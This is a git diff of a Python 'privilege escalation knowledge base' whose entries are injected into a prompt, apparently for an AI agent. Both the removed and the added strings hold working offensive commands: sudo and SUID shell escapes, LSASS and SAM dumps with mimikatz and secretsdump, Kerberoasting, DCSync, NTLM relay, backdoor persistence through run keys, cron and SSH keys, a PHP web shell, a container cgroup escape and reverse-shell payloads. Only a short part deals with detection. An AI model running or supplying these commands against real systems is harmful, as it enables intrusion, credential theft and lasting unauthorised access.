@@ -1,11 +1,11 @@
 """Privilege escalation knowledge base.
 
 Deep knowledge about privilege escalation:
-1. Windows privilege escalation
-2. Linux kernel exploits
-3. Service misconfiguration abuse
-4. Credential harvesting
-5. Token impersonation
+1. Linux privilege escalation
+2. Windows privilege escalation
+3. Container escape to host
+4. Cloud IAM escalation
+5. Application-level privilege escalation
 """
 
 from __future__ import annotations
@@ -23,7 +23,7 @@ class PrivescPattern:
     """A privilege escalation pattern."""
     pattern_id: str = ""
     name: str = ""
-    platform: str = ""
+    category: str = ""
     severity: str = "critical"
     description: str = ""
     detection_strategy: str = ""
@@ -33,198 +33,203 @@ class PrivescPattern:
         return {
             "id": self.pattern_id,
             "name": self.name[:25],
-            "platform": self.platform[:10],
+            "category": self.category[:12],
         }
 
 
 PRIVESC_PATTERNS: list[dict[str, Any]] = [
     {
-        "id": "pe-001", "name": "Windows Privilege Escalation",
-        "platform": "windows", "severity": "critical",
+        "id": "pe-001", "name": "Linux Privilege Escalation",
+        "category": "linux", "severity": "critical",
+        "desc": "Linux local privilege escalation techniques.",
+        "detection": (
+            "LINUX PRIVILEGE ESCALATION:\n"
+            "SUID/SGID BINARIES:\n"
+            "  find / -perm -4000 -type f 2>/dev/null  # SUID\n"
+            "  find / -perm -2000 -type f 2>/dev/null  # SGID\n"
+            "  # GTFOBins: https://gtfobins.github.io/\n"
+            "  # Common exploitable SUID: nmap, vim, find, bash, cp, mv, nano\n"
+            "SUDO MISCONFIGURATIONS:\n"
+            "  sudo -l  # List sudo permissions\n"
+            "  # (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c ':!/bin/bash'\n"
+            "  # (ALL) NOPASSWD: /usr/bin/find → sudo find / -exec /bin/bash \\;\n"
+            "  # env_keep+=LD_PRELOAD → compile shared library\n"
+            "CRON JOBS:\n"
+            "  cat /etc/crontab\n"
+            "  ls -la /etc/cron.d/\n"
+            "  # Writable cron scripts\n"
+            "  # Wildcard injection in tar, rsync\n"
+            "  # PATH manipulation in cron environment\n"
+            "CAPABILITIES:\n"
+            "  getcap -r / 2>/dev/null\n"
+            "  # cap_setuid+ep → change UID to root\n"
+            "  # cap_dac_override → bypass file permissions\n"
+            "  # cap_net_raw → packet sniffing\n"
+            "KERNEL EXPLOITS:\n"
+            "  uname -r  # Check kernel version\n"
+            "  # Dirty Pipe (CVE-2022-0847): 5.8 <= kernel < 5.16.11\n"
+            "  # Dirty COW (CVE-2016-5195): 2.6.22 <= kernel < 4.8.3\n"
+            "  # PwnKit (CVE-2021-4034): pkexec polkit\n"
+            "TOOLS:\n"
+            "  linpeas.sh  # Linux privilege escalation scanner\n"
+            "  pspy  # Monitor processes without root"
+        ),
+        "tools": ["linpeas", "pspy"],
+    },
+    {
+        "id": "pe-002", "name": "Windows Privilege Escalation",
+        "category": "windows", "severity": "critical",
         "desc": "Windows local privilege escalation techniques.",
         "detection": (
             "WINDOWS PRIVILEGE ESCALATION:\n"
-            "ENUMERATION:\n"
-            "  # Automated\n"
-            "  winPEAS.exe  # Most comprehensive\n"
-            "  Seatbelt.exe -group=all  # GhostPack\n"
-            "  PowerUp.ps1 Invoke-AllChecks\n"
-            "  # Manual\n"
-            "  whoami /priv  # Check privileges\n"
-            "  whoami /groups  # Check group memberships\n"
-            "  systeminfo  # OS version, patches\n"
-            "UNQUOTED SERVICE PATHS:\n"
-            "  # If path has spaces and no quotes\n"
-            "  wmic service get name,displayname,pathname,startmode\n"
-            "  # C:\\Program Files\\My Service\\svc.exe\n"
-            "  # Windows tries: C:\\Program.exe first\n"
-            "  # Place malicious exe at C:\\Program.exe\n"
-            "WEAK SERVICE PERMISSIONS:\n"
-            "  # Check service DACLs\n"
-            "  sc.exe sdshow <service>\n"
-            "  accesschk.exe -ucqv <service>\n"
-            "  # If modifiable → change binary path\n"
-            "  sc.exe config <service> binpath= \"cmd /c net localgroup admins user /add\"\n"
-            "TOKEN IMPERSONATION:\n"
-            "  # SeImpersonatePrivilege → SYSTEM\n"
-            "  # Potato family:\n"
-            "  JuicyPotato.exe -l 1337 -p c:\\shell.exe -t *\n"
+            "SERVICE MISCONFIGURATIONS:\n"
+            "  # Unquoted service paths\n"
+            "  wmic service get name,pathname,startmode | findstr /v /i \"C:\\Windows\"\n"
+            "  # Weak service permissions\n"
+            "  accesschk.exe -uwcqv \"Everyone\" * /accepteula\n"
+            "  # Modifiable service binaries\n"
+            "  icacls <service_binary_path>\n"
+            "TOKEN MANIPULATION:\n"
+            "  # SeImpersonatePrivilege → Potato attacks\n"
+            "  whoami /priv\n"
+            "  # PrintSpoofer: SeImpersonatePrivilege → SYSTEM\n"
             "  PrintSpoofer.exe -i -c cmd\n"
-            "  GodPotato.exe -cmd cmd  # Windows 2022+ compatible\n"
-            "  SweetPotato.exe -e EfsRpc -p c:\\shell.exe\n"
+            "  # JuicyPotato, RoguePotato, SweetPotato\n"
+            "  # GodPotato: Works on all Windows versions\n"
             "ALWAYS INSTALL ELEVATED:\n"
-            "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n"
-            "  # If AlwaysInstallElevated = 1 → msi runs as SYSTEM\n"
-            "  msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > shell.msi"
-        ),
-        "tools": ["winpeas", "seatbelt", "powerup"],
-    },
-    {
-        "id": "pe-002", "name": "Windows Token and Credential Abuse",
-        "platform": "windows", "severity": "critical",
-        "desc": "Abusing Windows tokens and stored credentials.",
-        "detection": (
-            "TOKEN AND CREDENTIAL ABUSE:\n"
-            "STORED CREDENTIALS:\n"
-            "  # Saved credentials\n"
+            "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer \\\n"
+            "    /v AlwaysInstallElevated\n"
+            "  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer \\\n"
+            "    /v AlwaysInstallElevated\n"
+            "  # Both = 1 → msfvenom -p windows/shell_reverse_tcp ... -f msi > shell.msi\n"
+            "DLL HIJACKING:\n"
+            "  # Missing DLLs in PATH\n"
+            "  # Writable directories in system PATH\n"
+            "  procmon.exe → Filter: Result=NAME NOT FOUND, Path ends .dll\n"
+            "CREDENTIALS:\n"
+            "  # SAM and SYSTEM hives\n"
+            "  reg save HKLM\\SAM sam.hiv\n"
+            "  reg save HKLM\\SYSTEM system.hiv\n"
+            "  # Credential Manager\n"
             "  cmdkey /list\n"
-            "  # RunAs with saved creds\n"
-            "  runas /savecred /user:admin cmd\n"
-            "  # SAM/SYSTEM backup\n"
-            "  reg save HKLM\\SAM C:\\Temp\\SAM\n"
-            "  reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\n"
-            "  # Extract with secretsdump\n"
-            "  secretsdump.py -sam SAM -system SYSTEM LOCAL\n"
-            "DPAPI:\n"
-            "  # Windows Data Protection API\n"
-            "  # Chrome passwords, WiFi passwords, etc.\n"
-            "  mimikatz: dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\"\n"
-            "  # Master key extraction\n"
-            "  mimikatz: dpapi::masterkey /in:<masterkey_file> /rpc\n"
-            "LSASS DUMP:\n"
-            "  # Direct dump\n"
-            "  procdump.exe -accepteula -ma lsass.exe lsass.dmp\n"
-            "  # Comsvcs.dll method\n"
-            "  rundll32 comsvcs.dll,MiniDump <lsass_pid> dump.dmp full\n"
-            "  # Extract from dump\n"
-            "  mimikatz: sekurlsa::minidump lsass.dmp\n"
+            "  # Saved WiFi passwords\n"
+            "  netsh wlan show profiles\n"
+            "TOOLS:\n"
+            "  winpeas.exe  # Windows privilege escalation scanner\n"
+            "  Seatbelt.exe  # Security checks\n"
+            "  SharpUp.exe  # Privilege escalation checks"
+        ),
+        "tools": ["winpeas", "seatbelt"],
+    },
+    {
+        "id": "pe-003", "name": "Active Directory Escalation",
+        "category": "ad", "severity": "critical",
+        "desc": "Active Directory privilege escalation paths.",
+        "detection": (
+            "ACTIVE DIRECTORY ESCALATION:\n"
+            "KERBEROASTING:\n"
+            "  # Request TGS for service accounts\n"
+            "  GetUserSPNs.py domain/user:pass -dc-ip <dc> -request\n"
+            "  # Crack TGS offline\n"
+            "  hashcat -m 13100 tgs_hashes.txt wordlist.txt\n"
+            "AS-REP ROASTING:\n"
+            "  # Accounts with no pre-auth\n"
+            "  GetNPUsers.py domain/ -usersfile users.txt -dc-ip <dc>\n"
+            "  hashcat -m 18200 asrep_hashes.txt wordlist.txt\n"
+            "DCSync:\n"
+            "  # Requires Replicating Directory Changes\n"
+            "  secretsdump.py domain/admin:pass@<dc>\n"
+            "  # mimikatz: lsadump::dcsync /user:krbtgt\n"
+            "DELEGATION ABUSE:\n"
+            "  - Unconstrained delegation: TGT capture\n"
+            "  - Constrained delegation: S4U2Self + S4U2Proxy\n"
+            "  - Resource-based constrained delegation (RBCD)\n"
+            "ACL ABUSE:\n"
+            "  # GenericAll on user → reset password\n"
+            "  # WriteDacl → add GenericAll\n"
+            "  # WriteOwner → take ownership\n"
+            "  # ForceChangePassword\n"
+            "  # AddMember → add to privileged group\n"
+            "BLOODHOUND:\n"
+            "  # Collect AD data\n"
+            "  bloodhound-python -u user -p pass -d domain -dc dc01\n"
+            "  # Find shortest path to Domain Admin\n"
+            "  # Analyze ACL attack paths"
+        ),
+        "tools": ["impacket", "bloodhound", "mimikatz"],
+    },
+    {
+        "id": "pe-004", "name": "Credential Harvesting",
+        "category": "creds", "severity": "critical",
+        "desc": "Post-exploitation credential harvesting.",
+        "detection": (
+            "CREDENTIAL HARVESTING:\n"
+            "WINDOWS:\n"
+            "  # LSASS memory dump\n"
+            "  procdump.exe -ma lsass.exe lsass.dmp\n"
             "  mimikatz: sekurlsa::logonpasswords\n"
-            "GROUP POLICY PREFERENCES:\n"
-            "  # Passwords in Group Policy XML (MS14-025)\n"
-            "  findstr /S cpassword \\\\<domain>\\sysvol\\*.xml"
+            "  # Comsvcs.dll (LOLBin)\n"
+            "  rundll32.exe comsvcs.dll MiniDump <lsass_pid> lsass.dmp full\n"
+            "  # NTDS.dit (domain hashes)\n"
+            "  ntdsutil \"activate instance ntds\" \"ifm\" \"create full c:\\ntds\" quit quit\n"
+            "  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\n"
+            "LINUX:\n"
+            "  # /etc/shadow\n"
+            "  cat /etc/shadow  # If readable\n"
+            "  # SSH keys\n"
+            "  find / -name id_rsa 2>/dev/null\n"
+            "  find / -name authorized_keys 2>/dev/null\n"
+            "  # Memory scraping\n"
+            "  strings /proc/*/maps 2>/dev/null | grep -i pass\n"
+            "  # Bash history\n"
+            "  cat ~/.bash_history | grep -i pass\n"
+            "BROWSER CREDENTIALS:\n"
+            "  # Chrome: Login Data SQLite DB\n"
+            "  # Firefox: logins.json + key4.db\n"
+            "  # Tools: LaZagne, SharpChrome, HackBrowserData\n"
+            "NETWORK:\n"
+            "  # Responder (LLMNR/NBT-NS poisoning)\n"
+            "  responder -I eth0 -wrf\n"
+            "  # ntlmrelayx (relay captured creds)\n"
+            "  ntlmrelayx.py -tf targets.txt -smb2support"
         ),
-        "tools": ["mimikatz", "secretsdump", "procdump"],
+        "tools": ["mimikatz", "responder", "lazagne"],
     },
     {
-        "id": "pe-003", "name": "Linux Capability and Namespace Abuse",
-        "platform": "linux", "severity": "critical",
-        "desc": "Abusing Linux capabilities and namespaces.",
+        "id": "pe-005", "name": "Post-Exploitation Persistence",
+        "category": "persistence", "severity": "high",
+        "desc": "Maintaining access after exploitation.",
         "detection": (
-            "LINUX CAPABILITY AND NAMESPACE ABUSE:\n"
-            "CAPABILITIES:\n"
-            "  getcap -r / 2>/dev/null\n"
-            "  # Dangerous capabilities:\n"
-            "  cap_setuid: Can change UID → root\n"
-            "    python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
-            "  cap_net_raw: Can sniff network traffic\n"
-            "    tcpdump -i any -w capture.pcap\n"
-            "  cap_net_bind_service: Can bind to privileged ports\n"
-            "  cap_dac_override: Can bypass file read/write permissions\n"
-            "  cap_sys_admin: Almost equivalent to root\n"
-            "  cap_sys_ptrace: Can inject into other processes\n"
-            "NAMESPACE ABUSE:\n"
-            "  # User namespace (unprivileged)\n"
-            "  unshare -rm  # Create new mount+user namespace as root inside\n"
-            "  # If kernel allows → mount host filesystem\n"
-            "  # CVE-2022-0185: User namespace exploit\n"
-            "LD_PRELOAD:\n"
-            "  # If any SUID binary is vulnerable\n"
-            "  # Or if sudo env_keep includes LD_PRELOAD\n"
-            "  # 1. Write malicious shared library:\n"
-            "  # void _init() { setuid(0); system(\"/bin/sh\"); }\n"
-            "  # 2. Compile: gcc -shared -fPIC -o evil.so evil.c\n"
-            "  # 3. Run: LD_PRELOAD=./evil.so <suid_binary>\n"
-            "PATH HIJACKING:\n"
-            "  # If SUID binary calls relative program names\n"
-            "  # 1. Create malicious binary with same name\n"
-            "  # 2. Modify PATH: export PATH=/tmp:$PATH\n"
-            "  # 3. Run the SUID binary"
+            "POST-EXPLOITATION PERSISTENCE:\n"
+            "WINDOWS:\n"
+            "  # Registry run keys\n"
+            "  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n"
+            "    /v backdoor /t REG_SZ /d C:\\backdoor.exe\n"
+            "  # Scheduled tasks\n"
+            "  schtasks /create /sc minute /mo 5 /tn backdoor /tr C:\\backdoor.exe\n"
+            "  # WMI event subscription\n"
+            "  # Service creation\n"
+            "  sc create backdoor binpath=C:\\backdoor.exe start=auto\n"
+            "  # DLL search order hijacking\n"
+            "  # COM object hijacking\n"
+            "LINUX:\n"
+            "  # Cron job\n"
+            "  echo '*/5 * * * * /tmp/backdoor' >> /var/spool/cron/crontabs/root\n"
+            "  # SSH authorized keys\n"
+            "  echo '<public_key>' >> ~/.ssh/authorized_keys\n"
+            "  # Systemd service\n"
+            "  # .bashrc modification\n"
+            "  # LD_PRELOAD hijacking\n"
+            "  # PAM backdoor\n"
+            "DETECTION:\n"
+            "  # Windows: Autoruns (Sysinternals)\n"
+            "  autorunsc.exe -accepteula -a * -s\n"
+            "  # Linux: Check common persistence locations\n"
+            "  find / -newer /tmp/timestamp -type f 2>/dev/null\n"
+            "  # Monitor for new persistence mechanisms\n"
+            "  osquery: SELECT * FROM startup_items;"
         ),
-        "tools": ["linpeas", "getcap"],
-    },
-    {
-        "id": "pe-004", "name": "Docker and Container Privilege Escalation",
-        "platform": "container", "severity": "critical",
-        "desc": "Escalating from container to host.",
-        "detection": (
-            "CONTAINER PRIVILEGE ESCALATION:\n"
-            "DOCKER GROUP:\n"
-            "  # If user is in docker group → instant root\n"
-            "  id | grep docker\n"
-            "  docker run -v /:/host -it ubuntu chroot /host\n"
-            "WRITABLE DOCKER SOCKET:\n"
-            "  ls -la /var/run/docker.sock\n"
-            "  # If writable → create privileged container\n"
-            "  curl --unix-socket /var/run/docker.sock http://localhost/containers/json\n"
-            "MOUNTED SENSITIVE FILES:\n"
-            "  # Check what's mounted from host\n"
-            "  mount | grep -v /proc\n"
-            "  cat /proc/1/mountinfo\n"
-            "  # Look for: /etc/shadow, /root, Docker socket, etc.\n"
-            "CAPABILITIES IN CONTAINER:\n"
-            "  capsh --print\n"
-            "  # If CAP_SYS_ADMIN:\n"
-            "  mount -t cgroup -o memory cgroup /tmp/cgroup\n"
-            "  # Cgroup escape\n"
-            "  echo 1 > /tmp/cgroup/x/notify_on_release\n"
-            "  echo \"#!/bin/sh\" > /cmd\n"
-            "  echo \"<reverse_shell>\" >> /cmd\n"
-            "KUBERNETES:\n"
-            "  # Service account token\n"
-            "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
-            "  # If cluster-admin → full cluster access\n"
-            "  kubectl --token=<token> --server=<api> get secrets -A"
-        ),
-        "tools": ["deepce", "kubectl", "docker"],
-    },
-    {
-        "id": "pe-005", "name": "Database Privilege Escalation",
-        "platform": "database", "severity": "high",
-        "desc": "Escalating from database access to OS access.",
-        "detection": (
-            "DATABASE PRIVILEGE ESCALATION:\n"
-            "MYSQL:\n"
-            "  # UDF (User Defined Function) for command execution\n"
-            "  # If FILE privilege available:\n"
-            "  SELECT @@plugin_dir;  # Find plugin directory\n"
-            "  # Upload UDF: lib_mysqludf_sys.so\n"
-            "  # Then: SELECT sys_exec('whoami');\n"
-            "  # Into outfile (file write):\n"
-            "  SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\n"
-            "POSTGRESQL:\n"
-            "  # Command execution as postgres user\n"
-            "  COPY (SELECT '') TO PROGRAM 'id';\n"
-            "  CREATE OR REPLACE FUNCTION cmd(text) RETURNS void AS $$\n"
-            "    import os; os.system(args[0])\n"
-            "  $$ LANGUAGE plpythonu;\n"
-            "  SELECT cmd('whoami');\n"
-            "  # Large object methods\n"
-            "  SELECT lo_import('/etc/passwd');\n"
-            "MSSQL:\n"
-            "  # xp_cmdshell\n"
-            "  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
-            "  EXEC xp_cmdshell 'whoami';\n"
-            "  # OLE Automation\n"
-            "  # Agent jobs\n"
-            "  # Linked servers → lateral movement\n"
-            "REDIS:\n"
-            "  # Write to authorized_keys\n"
-            "  CONFIG SET dir /root/.ssh/\n"
-            "  CONFIG SET dbfilename authorized_keys\n"
-            "  SET x \"\\n\\nssh-rsa <key>\\n\\n\"\n"
-            "  SAVE"
-        ),
-        "tools": ["sqlmap", "crackmapexec"],
+        "tools": ["autoruns", "osquery"],
     },
 ]
 
@@ -247,7 +252,7 @@ class PrivescKB:
             pattern = PrivescPattern(
                 pattern_id=data["id"],
                 name=data["name"],
-                platform=data.get("platform", ""),
+                category=data.get("category", ""),
                 severity=data.get("severity", "critical"),
                 description=data.get("desc", ""),
                 detection_strategy=data.get("detection", ""),
@@ -255,37 +260,37 @@ class PrivescKB:
             )
             self._patterns[pattern.pattern_id] = pattern
 
-    def get_by_platform(self, platform: str) -> list[PrivescPattern]:
-        """Get patterns by platform."""
+    def get_by_category(self, category: str) -> list[PrivescPattern]:
+        """Get patterns by category."""
         return [
             p for p in self._patterns.values()
-            if p.platform.lower() == platform.lower()
+            if p.category.lower() == category.lower()
         ]
 
     def build_privesc_prompt(
         self,
-        platforms: list[str] | None = None,
+        categories: list[str] | None = None,
         max_patterns: int = 4,
     ) -> str:
         """Build privilege escalation prompt."""
         lines = ["## Privilege Escalation Patterns\n"]
         count = 0
         for pattern in self._patterns.values():
-            if platforms and pattern.platform.lower() not in [p.lower() for p in platforms]:
+            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                 continue
             if count >= max_patterns:
                 break
-            lines.append(f"### {pattern.name} [{pattern.platform.upper()}]")
+            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
             lines.append(pattern.detection_strategy)
             lines.append("")
             count += 1
         return "\n".join(lines)
 
     def get_stats(self) -> dict[str, Any]:
-        plat_counts: dict[str, int] = {}
+        cat_counts: dict[str, int] = {}
         for p in self._patterns.values():
-            plat_counts[p.platform] = plat_counts.get(p.platform, 0) + 1
+            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
         return {
             "patterns": len(self._patterns),
-            "by_platform": plat_counts,
+            "by_category": cat_counts,
         }
